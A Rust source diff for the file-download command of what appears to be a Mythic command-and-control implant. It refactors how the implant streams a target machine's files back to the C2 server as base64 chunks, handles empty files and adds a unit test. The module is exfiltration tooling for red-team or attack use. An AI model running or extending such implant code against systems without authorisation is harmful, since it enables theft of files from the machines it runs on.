@@ -58,6 +58,41 @@ const MAX_CHUNK_SIZE: u32 = 8 * 1024 * 1024; // 8 MiB
 /// Hard ceiling on total file size to prevent runaway disk reads.
 const MAX_TOTAL_SIZE: u64 = 4 * 1024 * 1024 * 1024; // 4 GiB
 
+struct DownloadMeta {
+    task_id: Uuid,
+    total_chunks: u32,
+    chunk_size: u32,
+    filename: String,
+    full_path: String,
+    file_id: Uuid,
+}
+
+fn push_download_chunk(meta: &DownloadMeta, chunk_num: u32, encoded: String, is_last: bool) {
+    push_extra(TaskResponse {
+        task_id: meta.task_id,
+        completed: Some(is_last),
+        status: Some(if is_last {
+            "completed".into()
+        } else {
+            "processing".into()
+        }),
+        user_output: None,
+        download: Some(TaskDownload {
+            total_chunks: Some(meta.total_chunks),
+            chunk_size: Some(meta.chunk_size),
+            chunk_num: Some(chunk_num),
+            chunk_data: Some(encoded),
+            filename: Some(meta.filename.clone()),
+            full_path: Some(meta.full_path.clone()),
+            // host left None — Mythic fills it from the callback
+            host: None,
+            is_screenshot: false,
+            file_id: Some(meta.file_id),
+        }),
+        ..Default::default()
+    });
+}
+
 // ── Main handler ────────────────────────────────────────────
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
@@ -88,13 +123,19 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     let mut file = match File::open(path) {
         Ok(f) => f,
         Err(e) => {
-            return TaskResponse::failed(task.id, &format!("read {} failed: {e}", display_path(path)));
+            return TaskResponse::failed(
+                task.id,
+                &format!("read {} failed: {e}", display_path(path)),
+            );
         }
     };
     let total_size = match file.metadata() {
         Ok(m) => m.len(),
         Err(e) => {
-            return TaskResponse::failed(task.id, &format!("stat {} failed: {e}", display_path(path)));
+            return TaskResponse::failed(
+                task.id,
+                &format!("stat {} failed: {e}", display_path(path)),
+            );
         }
     };
     if total_size > MAX_TOTAL_SIZE {
@@ -115,7 +156,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     let total_chunks: u32 = if total_size == 0 {
         1
     } else {
-        ((total_size + chunk_size as u64 - 1) / chunk_size as u64) as u32
+        total_size.div_ceil(chunk_size as u64) as u32
     };
     let file_id = Uuid::new_v4();
 
@@ -124,12 +165,26 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         full_path, total_size, total_chunks, chunk_size
     );
 
+    let download_meta = DownloadMeta {
+        task_id: task.id,
+        total_chunks,
+        chunk_size,
+        filename: filename.clone(),
+        full_path: full_path.clone(),
+        file_id,
+    };
+
     // 3. Stream-read each chunk, base64-encode, push as extra response.
     //    Single read buffer reused across chunks; no seek (sequential read).
     //    Memory is bounded to ~chunk_size regardless of file size.
     let mut buf = vec![0u8; chunk_size as usize];
     let mut bytes_sent: u64 = 0;
     let mut chunk_num: u32 = 0;
+
+    if total_size == 0 {
+        chunk_num = 1;
+        push_download_chunk(&download_meta, chunk_num, String::new(), true);
+    }
 
     while bytes_sent < total_size {
         chunk_num += 1;
@@ -174,29 +229,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         // one. Mythic's reassembly is keyed on (task_id, file_id) so the
         // final summary `TaskResponse` (returned below) can carry the
         // completion flag without racing with the chunk push.
-        push_extra(TaskResponse {
-            task_id: task.id,
-            completed: Some(is_last),
-            status: Some(if is_last {
-                "completed".into()
-            } else {
-                "processing".into()
-            }),
-            user_output: None,
-            download: Some(TaskDownload {
-                total_chunks: Some(total_chunks),
-                chunk_size: Some(chunk_size),
-                chunk_num: Some(chunk_num),
-                chunk_data: Some(encoded),
-                filename: Some(filename.clone()),
-                full_path: Some(full_path.clone()),
-                // host left None — Mythic fills it from the callback
-                host: None,
-                is_screenshot: false,
-                file_id: Some(file_id),
-            }),
-            ..Default::default()
-        });
+        push_download_chunk(&download_meta, chunk_num, encoded, is_last);
     }
 
     // Final summary
@@ -209,5 +242,47 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             filename, total_size, chunk_num
         )),
         ..Default::default()
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn temp_file(name: &str) -> std::path::PathBuf {
+        let mut path = std::env::temp_dir();
+        path.push(format!(
+            "nanaz_download_test_{}_{}",
+            std::process::id(),
+            name
+        ));
+        path
+    }
+
+    #[test]
+    fn test_download_empty_file_sends_one_chunk() {
+        let path = temp_file("empty.bin");
+        std::fs::write(&path, b"").unwrap();
+        let _ = crate::take_extra();
+
+        let task = TaskMessage {
+            command: "download".into(),
+            parameters: serde_json::json!({ "path": path.to_string_lossy() }).to_string(),
+            ..Default::default()
+        };
+
+        let resp = handle(&task);
+        assert_eq!(resp.status.as_deref(), Some("completed"));
+        assert!(resp.user_output.unwrap_or_default().contains("1 chunks"));
+
+        let extras = crate::take_extra();
+        assert_eq!(extras.len(), 1);
+        let chunk = extras[0].download.as_ref().expect("download chunk set");
+        assert_eq!(chunk.total_chunks, Some(1));
+        assert_eq!(chunk.chunk_num, Some(1));
+        assert_eq!(chunk.chunk_data.as_deref(), Some(""));
+        assert_eq!(extras[0].completed, Some(true));
+
+        let _ = std::fs::remove_file(path);
     }
 }
